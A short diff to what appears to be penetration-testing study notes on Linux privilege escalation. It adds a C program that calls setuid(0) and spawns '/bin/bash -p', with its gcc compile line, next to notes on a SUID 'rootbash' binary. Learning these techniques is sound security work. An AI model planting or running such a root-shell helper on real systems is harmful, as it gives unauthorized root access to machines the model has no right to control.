@@ -108,4 +108,13 @@ Make sure it is owned by root user and has the SUID bit set
 ./rootbash -p 
 
 ```
+Create a custom exe
+```
+int main() {
+  setuid(0);
+  system("/bin/bash -p");
+ }
+ 
+ Compile with gcc -o shellin shellin.c
 
+```
